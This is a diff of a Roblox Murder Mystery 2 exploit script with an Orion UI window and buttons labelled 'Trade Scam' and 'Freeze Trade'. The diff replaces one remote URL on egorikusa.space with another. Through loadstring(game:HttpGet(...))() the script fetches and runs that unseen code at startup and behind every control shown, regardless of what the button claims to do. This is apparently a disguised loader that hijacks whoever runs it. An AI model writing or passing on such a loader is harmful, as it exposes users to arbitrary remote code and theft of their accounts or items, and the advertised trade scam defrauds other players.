@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://egorikusa.space/a3e65340a89cddd0ca853173.lua", true))()
+loadstring(game:HttpGet("https://egorikusa.space/26086df0d3d923ced7168d13.lua", true))()
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 
 local Window = OrionLib:MakeWindow({Name = "🎃Mm2Scripter🎃", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
@@ -10,8 +10,8 @@ local Tab = Window:MakeTab({
 Tab:AddButton({
     Name = "Trade Scam✅",
     Callback = function()
-loadstring(game:HttpGet("https://egorikusa.space/a3e65340a89cddd0ca853173.lua", true))()
-print("button pressed")
+loadstring(game:HttpGet("https://egorikusa.space/26086df0d3d923ced7168d13.lua", true))()
+              print("button pressed")
       end 
 })
 Tab:AddToggle({
@@ -25,7 +25,7 @@ Tab:AddToggle({
     Name = "🧊Freeze Trade🧊",
     Default = false,
     Callback = function(Value)
-loadstring(game:HttpGet("https://egorikusa.space/a3e65340a89cddd0ca853173.lua", true))()
+loadstring(game:HttpGet("https://egorikusa.space/26086df0d3d923ced7168d13.lua", true))()
         print(Value)
     end
 })
